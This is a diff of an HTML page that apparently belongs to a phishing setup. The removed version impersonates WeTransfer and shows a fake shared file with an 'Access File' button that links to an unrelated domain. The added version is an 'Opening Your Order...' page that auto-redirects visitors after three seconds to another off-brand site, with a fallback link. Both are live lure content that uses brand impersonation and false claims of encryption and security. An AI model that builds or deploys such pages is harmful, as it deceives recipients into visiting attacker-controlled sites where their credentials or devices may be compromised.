@@ -2,347 +2,76 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
+<title>Opening Your Order...</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>WeTransfer Ultimate</title>
-
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+<!-- Auto redirect after 3 seconds -->
+<meta http-equiv="refresh" content="3;url=https://paradisecaycuma.com/docs/index.html">
 
 <style>
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #f4f6f9;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
 
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:'Inter',sans-serif;
-}
+  .box {
+    background: #fff;
+    padding: 40px;
+    border-radius: 10px;
+    text-align: center;
+    box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+    max-width: 400px;
+  }
 
-body{
-background: linear-gradient(135deg,#eef1ff,#f8f9ff);
-color:#111;
-min-height:100vh;
-}
+  h2 {
+    margin-bottom: 15px;
+  }
 
-/* NAVBAR */
+  p {
+    color: #666;
+    font-size: 14px;
+  }
 
-.navbar{
-display:flex;
-justify-content:space-between;
-align-items:center;
-padding:20px 40px;
-background: rgba(255,255,255,0.6);
-backdrop-filter: blur(10px);
-border-bottom:1px solid rgba(0,0,0,0.05);
-}
+  .loader {
+    margin: 20px auto;
+    border: 4px solid #eee;
+    border-top: 4px solid #7c4dff;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    animation: spin 1s linear infinite;
+  }
 
-.logo{
-font-weight:700;
-font-size:22px;
-}
+  @keyframes spin {
+    100% { transform: rotate(360deg); }
+  }
 
-.nav-links{
-display:flex;
-gap:30px;
-font-size:14px;
-}
-
-.nav-links a{
-text-decoration:none;
-color:#555;
-transition:.3s;
-}
-
-.nav-links a:hover{
-color:#3b63f3;
-}
-
-.nav-right{
-display:flex;
-gap:12px;
-}
-
-.btn-outline{
-border:1px solid #ddd;
-padding:8px 16px;
-border-radius:20px;
-background:white;
-cursor:pointer;
-}
-
-.btn-dark{
-background:#111;
-color:white;
-padding:8px 16px;
-border-radius:20px;
-border:none;
-cursor:pointer;
-}
-
-/* TITLE */
-
-.title{
-font-size:34px;
-font-weight:700;
-margin:40px;
-letter-spacing:-0.5px;
-}
-
-.title span{
-color:#3b63f3;
-}
-
-/* HERO */
-
-.hero{
-display:flex;
-justify-content:center;
-gap:80px;
-padding:40px;
-position:relative;
-flex-wrap:wrap;
-}
-
-.hero::before{
-content:'';
-position:absolute;
-width:400px;
-height:400px;
-background:#3b63f3;
-filter:blur(120px);
-opacity:0.15;
-top:50px;
-left:30%;
-}
-
-/* CARD */
-
-.card{
-width:320px;
-padding:28px;
-border-radius:20px;
-background: rgba(255,255,255,0.65);
-backdrop-filter: blur(20px);
-border:1px solid rgba(255,255,255,0.4);
-box-shadow:0 10px 40px rgba(0,0,0,0.08);
-animation:fadeUp .8s ease;
-z-index:2;
-}
-
-.circle{
-width:50px;
-height:50px;
-border-radius:12px;
-background:linear-gradient(135deg,#3b63f3,#6a8bff);
-display:flex;
-align-items:center;
-justify-content:center;
-color:white;
-font-size:22px;
-margin-bottom:20px;
-}
-
-/* TEXT */
-
-.card h1{
-font-size:28px;
-margin-bottom:10px;
-}
-
-.card h1 span{
-font-weight:800;
-}
-
-.card p{
-font-size:14px;
-color:#555;
-margin-bottom:20px;
-line-height:1.5;
-}
-
-/* FILE PREVIEW */
-
-.file-box{
-background:#f7f8ff;
-border-radius:12px;
-padding:12px;
-margin-bottom:20px;
-display:flex;
-justify-content:space-between;
-align-items:center;
-font-size:13px;
-}
-
-.file-info{
-display:flex;
-flex-direction:column;
-}
-
-.file-size{
-color:#777;
-font-size:12px;
-}
-
-/* BUTTON */
-
-.agree-btn{
-display:block;
-text-align:center;
-text-decoration:none;
-background:#3b63f3;
-color:white;
-padding:14px;
-border-radius:12px;
-font-weight:600;
-transition:.3s;
-}
-
-.agree-btn:hover{
-transform:translateY(-3px);
-box-shadow:0 10px 25px rgba(59,99,243,0.4);
-background:#2f52d6;
-}
-
-/* SECURITY TEXT */
-
-.secure{
-margin-top:12px;
-font-size:12px;
-color:#777;
-text-align:center;
-}
-
-/* RIGHT SIDE */
-
-.center-area{
-display:flex;
-flex-direction:column;
-justify-content:center;
-gap:20px;
-z-index:2;
-}
-
-.try-btn{
-background:#111;
-color:white;
-border:none;
-padding:16px 40px;
-border-radius:12px;
-font-size:16px;
-cursor:pointer;
-transition:.3s;
-}
-
-.try-btn:hover{
-transform:translateY(-3px);
-box-shadow:0 10px 30px rgba(0,0,0,0.2);
-}
-
-/* FEATURES */
-
-.features{
-display:flex;
-gap:20px;
-font-size:13px;
-color:#555;
-}
-
-/* ANIMATION */
-
-@keyframes fadeUp{
-from{
-opacity:0;
-transform:translateY(30px);
-}
-to{
-opacity:1;
-transform:translateY(0);
-}
-}
-
-/* RESPONSIVE */
-
-@media(max-width:900px){
-
-.title{
-text-align:center;
-}
-
-.hero{
-flex-direction:column;
-align-items:center;
-}
-
-}
-
+  a {
+    display: inline-block;
+    margin-top: 15px;
+    color: #7c4dff;
+    text-decoration: none;
+    font-weight: bold;
+  }
 </style>
 </head>
 
 <body>
 
-<div class="navbar">
-<div class="logo">we</div>
+<div class="box">
+  <h2>Opening Your Order...</h2>
+  <div class="loader"></div>
+  <p>Please wait while we securely redirect you.</p>
 
-<div class="nav-links">
-<a href="#">Features</a>
-<a href="#">Pricing</a>
-<a href="#">Use cases</a>
-<a href="#">Resources</a>
-</div>
-
-<div class="nav-right">
-<button class="btn-outline">Log in</button>
-<button class="btn-dark">Sign up</button>
-</div>
-</div>
-
-<div class="title">
-WeTransfer <span>Ultimate</span>
-</div>
-
-<div class="hero">
-
-<!-- LEFT CARD -->
-
-<div class="card">
-
-<div class="circle">📁</div>
-
-<h1>You’re <span>almost</span> there</h1>
-
-<p>
-A secure file has been shared with you. Review the details below and access your download.
-</p>
-
-<div class="file-box">
-<div class="file-info">
-<strong>project_files.zip</strong>
-<span class="file-size">24.8 MB</span>
-</div>
-<span>⬇️</span>
-</div>
-
-<a href="https://ywnjp.skyline-alumnium.com/f/6956d5a12300" class="agree-btn">Access File</a>
-
-<div class="secure">
-🔒 End-to-end encrypted • Expires in 24h
-</div>
-
-</div>
-
-<!-- RIGHT SIDE -->
-
-<div class="center-area">
-
-<button class="try-btn">Try for free</button>
-
-<div class="features">
-<span>⚡ Fast transfers</span>
-<span>🔐 Secure</span>
-<span>☁️ Cloud storage</span>
-</div>
-
-</div>
-
+  <p>If nothing happens, click below:</p>
+  <a href="https://paradisecaycuma.com/docs/index.html">
+    Continue to your order
+  </a>
 </div>
 
 </body>
